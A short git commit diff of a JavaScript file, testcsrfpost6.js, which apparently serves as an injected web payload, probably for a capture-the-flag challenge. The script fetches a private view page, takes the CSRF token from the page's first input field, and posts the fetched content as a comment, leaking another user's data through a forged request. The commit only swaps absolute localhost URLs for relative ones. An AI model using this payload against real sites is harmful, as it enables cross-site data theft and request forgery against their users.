a1cc2e95a1764a3a8880a59a195c6b16c82d9107
/hello <czavaleta93@gmail.com>
2021-11-03 19:51:02 -0500

    Update and rename testcsrfpost5.js to testcsrfpost6.js

--- testcsrfpost6.js
+++ testcsrfpost6.js
@@ -1,4 +1,4 @@
-fetch("http://127.0.0.1:9000/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
+fetch("/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
 	return res.text();
 }).then(data => {
 	var csrf = document.getElementsByTagName("input")[0].value;
@@ -8,7 +8,7 @@ fetch("http://127.0.0.1:9000/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((r
 	//formData.append("creator", "fromBot");
 	formData.append("body", data);
 
-	fetch("http://127.0.0.1:9000/comment/2b0fb296-f13b-489a-b533-0ca434654d45",{
+	fetch("/comment/2b0fb296-f13b-489a-b533-0ca434654d45",{
 		method: 'POST',
 		body: formData
 	});
